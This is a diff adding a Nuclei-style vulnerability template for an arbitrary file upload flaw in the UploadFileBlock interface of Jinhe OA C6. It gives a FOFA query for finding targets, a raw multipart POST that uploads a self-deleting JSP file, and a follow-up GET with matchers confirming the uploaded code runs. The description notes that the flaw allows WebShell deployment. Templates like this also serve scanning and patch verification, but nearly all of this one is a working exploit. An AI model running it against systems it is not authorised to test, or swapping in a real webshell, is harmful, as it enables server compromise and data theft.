@@ -1,0 +1,43 @@
+id: jinhe-oa-uploadfileblock-arbitrary-file-upload
+
+info:
+  name: "金和OA系统UploadFileBlock接口任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"||body="/jc6/platform/sys/login"
+          金和OA协同办公管理系统C6版本作为企业级办公自动化平台，其UploadFileBlock接口未正确验证上传文件类型及路径，导致攻击者可构造恶意请求实现任意文件上传。该缺陷可能被用于部署WebShell或篡改系统文件，威胁企业内部数据安全。
+  tags: 金和OA
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /jc6/JHSoft.WCF/Attachment/UploadFileBlock HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+    Accept-Language: zh-CN,zh;q=0.8
+    Content-Type: multipart/form-data; boundary=bbcea0206207b8222ea7bdee4e0f92fa
+
+    --bbcea0206207b8222ea7bdee4e0f92fa
+    Content-Disposition: form-data; name="filename"; filename="NTest.jsp"
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    --bbcea0206207b8222ea7bdee4e0f92fa--
+- raw:
+  - |
+    GET /jc6/upload/NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
